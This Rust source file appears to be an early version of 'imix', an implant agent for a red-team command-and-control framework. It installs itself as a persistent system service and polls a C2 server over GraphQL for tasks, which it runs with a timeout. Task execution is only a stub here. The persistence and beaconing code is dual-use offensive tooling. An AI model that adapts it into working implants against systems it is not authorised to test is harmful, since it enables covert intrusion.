use std::collections::HashMap;
use std::fs::{File, OpenOptions};
use std::io::{BufReader, Write};
use std::path::Path;
use std::time::Instant;

use clap::{Command, arg};
use anyhow::{Result, Error};
use tokio::task;
use tokio::time::{Duration,sleep};
use imix::graphql::{GraphQLTask, self};

async fn install(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(target_os = "windows")]
    return imix::windows::install(config).await;
	
    #[cfg(target_os = "linux")]
    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
        return imix::linux::install(config).await;
    }
	 
	unimplemented!("The current OS/Service Manager is not supported")
}

async fn handle_exec_tome() -> Result<(String,String)> {
    let mut rng = rand::random::<u64>();
    rng = (rng+3) % 30;
    tokio::time::sleep(Duration::from_secs(rng)).await;
    Ok(("Hello".to_string(), "".to_string()))
}

async fn handle_exec_timeout(imix_config: imix::Config, task: graphql::GraphQLTask) -> Result<(), Error> {
    // Tasks will be forcebly stopped after 1 week.
    let timeout_duration = Duration::from_secs(60*60*24*7); // 1 Week.

    // Define a future for our execution task
    let exec_future = handle_exec_tome();

    // Execute that future with a timeout defined by the timeout argument.
    let tome_output = match tokio::time::timeout(timeout_duration, exec_future).await {
        Ok(res) => {
            match res {
                Ok(tome_result) => tome_result,
                Err(tome_error) => return Err(tome_error),
            }
        },
        // If our timeout timer has expired set the port state to timeout and return.
        Err(_timer_elapsed) => {
            return Err(anyhow::anyhow!("Eldritch timeout elapsed"));
        },
    };


    // Do response.
    let mut file = OpenOptions::new()
    .write(true)
    .append(true)
    .open("/tmp/test-output.txt")
    .unwrap();

    let _ = file.write_all(tome_output.0.as_bytes());

    Ok(())
}

// Async handler for port scanning.
async fn main_loop(config_path: String) -> Result<()> {
    let debug = true;
    let config_file = File::open(config_path)?;
    let reader = BufReader::new(config_file);
    let imix_config: imix::Config = serde_json::from_reader(reader)?;

    let mut all_exec_futures: HashMap<String, _> = HashMap::new();

    loop {
        // 0. Get loop start time
        let loop_start_time = Instant::now();


        // 1. Pull down new tasks
        let new_tasks = match graphql::gql_claim_tasks(imix_config.callback_config.c2_configs[0].uri.clone()).await {
            Ok(tasks) => tasks,
            Err(error) => {
                if debug {
                    println!("main_loop: error claiming task\n{:?}", error)
                }
                continue;
            },
        };

        // 2. Start new tasks
        for task in new_tasks {
            let exec_with_timeout = handle_exec_timeout(imix_config.clone(), task.clone());
            match all_exec_futures.insert(task.clone().id, task::spawn(exec_with_timeout)) {
                Some(old_task) => {
                    if debug {
                        println!("main_loop: error adding new task. Non-unique taskID\n");
                    }
                },
                None => {},
            }
        }

        // Queue new jobs
        // all_exec_futures.insert(rand::random::<u64>().to_string(), );

        // Wait sleep time
        tokio::time::sleep(Duration::from_secs(5)).await;

        // Check status
        for exec_future in all_exec_futures.iter() {
            println!("{}: {:?}", exec_future.0, exec_future.1.is_finished());
        }
    }
}


pub fn main() -> Result<(), imix::Error> {
    let matches = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false)
        )
        .subcommand(
            Command::new("install")
                .about("Run in install mode")
                .arg(
                    arg!(
                        -c --config <FILE> "Sets a custom config file"
                    )
                    .required(true)
                )
        )
        .get_matches();

    
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
  

    match matches.subcommand() {
        Some(("install", args)) => {
            let config_path = args.value_of("config").unwrap();
            match runtime.block_on(
                install(String::from(config_path))
            ) {
                Ok(_response) => {},
                Err(_error) => {},
            }
        },
        _ => {},
    }

    if let Some(config_path) = matches.value_of("config") {
        match runtime.block_on(main_loop(config_path.to_string())) {
            Ok(_) => todo!(),
            Err(_) => todo!(),
        }
    }
    Ok(())
}